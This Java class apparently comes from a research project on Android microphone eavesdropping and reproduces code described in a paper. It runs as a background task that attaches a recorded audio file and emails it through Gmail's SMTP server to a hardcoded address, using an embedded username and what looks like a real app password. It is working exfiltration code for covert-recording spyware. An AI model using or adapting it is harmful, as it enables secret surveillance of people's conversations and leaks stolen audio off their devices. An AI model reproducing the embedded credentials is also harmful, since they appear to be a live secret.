package com.research.microphoneeavesdropping;

import android.os.AsyncTask;
import android.util.Log;

import java.io.File;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

/**
 * Handles email delivery of recorded audio files
 * Implementation follows the code example in section 6.4.3 of the paper
 */
public class SendEmail extends AsyncTask<File, Void, Boolean> {

    private static final String TAG = "SendEmail";

    // Email configuration - replace with actual values for testing
    private static final String HOST = "smtp.gmail.com";
    private static final String PORT = "587";
    private static final String USERNAME = "testmor171717@gmail.com";
    private static final String PASSWORD = "tuurrzhszuhxiaim";
    private static final String RECIPIENT = "testmor171717@gmail.com";

    @Override
    protected Boolean doInBackground(File... files) {
        if (files == null || files.length == 0 || files[0] == null) {
            Log.e(TAG, "No file provided for email attachment");
            return false;
        }

        File audioFile = files[0];
        if (!audioFile.exists()) {
            Log.e(TAG, "Audio file does not exist: " + audioFile.getAbsolutePath());
            return false;
        }

        try {
            // Configure mail session
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", HOST);
            props.put("mail.smtp.port", PORT);

            // Create authenticated session
            Session session = Session.getInstance(props,
                    new javax.mail.Authenticator() {
                        protected PasswordAuthentication getPasswordAuthentication() {
                            return new PasswordAuthentication(USERNAME, PASSWORD);
                        }
                    });

            // Create mime message as shown in the paper
            MimeMessage message = new MimeMessage(session);
            InternetAddress from = new InternetAddress(USERNAME);
            InternetAddress to = new InternetAddress(RECIPIENT);
            message.setFrom(from);
            message.setRecipient(Message.RecipientType.TO, to);
            message.setSubject("New Audio Recording");

            // Create body of email
            MimeBodyPart messageBodyPart = new MimeBodyPart();
            messageBodyPart.setContent("<b>New Audio File!</b>", "text/html");

            // Create attachment part
            MimeBodyPart attachment = new MimeBodyPart();
            String filename = audioFile.getAbsolutePath();
            DataSource source = new FileDataSource(filename);
            attachment.setDataHandler(new DataHandler(source));
            attachment.setFileName(audioFile.getName());

            // Create multipart message and add body parts
            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(messageBodyPart);
            multipart.addBodyPart(attachment);

            // Send the complete message parts
            message.setContent(multipart);

            // Send message
            Transport.send(message);
            Log.d(TAG, "Email sent successfully");

            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error sending email", e);
            return false;
        }
    }

    @Override
    protected void onPostExecute(Boolean result) {
        Log.d(TAG, "Email sending result: " + (result ? "success" : "failure"));
    }
}